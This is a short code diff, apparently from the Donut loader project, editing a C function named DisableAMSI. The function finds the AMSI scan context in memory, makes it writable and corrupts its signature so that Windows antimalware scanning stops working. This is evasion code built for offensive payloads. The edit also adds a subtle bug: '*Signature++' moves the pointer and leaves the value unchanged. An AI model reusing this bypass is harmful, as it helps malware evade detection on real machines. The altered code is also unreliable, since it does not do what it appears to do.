@@ -117,7 +117,7 @@ BOOL DisableAMSI(PDONUT_INSTANCE inst) {
     PBYTE          cs;
     DWORD          i, op, t;
     BOOL           disabled = FALSE;
-    _PHAMSICONTEXT ctx;
+    PDWORD         Signature;
     
     // try load amsi
     dll = inst->api.LoadLibraryA(inst->amsi.s);
@@ -129,15 +129,15 @@ BOOL DisableAMSI(PDONUT_INSTANCE inst) {
     
     // scan for signature
     for(i=0;;i++) {
-      ctx = (_PHAMSICONTEXT)&cs[i];
+      Signature = (PDWORD)&cs[i];
       // is it "AMSI"?
-      if(ctx->Signature == inst->amsi.w[0]) {
+      if(*Signature == inst->amsi.w[0]) {
         // set memory protection for write access
         inst->api.VirtualProtect(cs, sizeof(DWORD), 
           PAGE_EXECUTE_READWRITE, &op);
           
         // change signature
-        ctx->Signature++;
+        *Signature++;
         
         // set memory back to original protection
         inst->api.VirtualProtect(cs, sizeof(DWORD), op, &t);
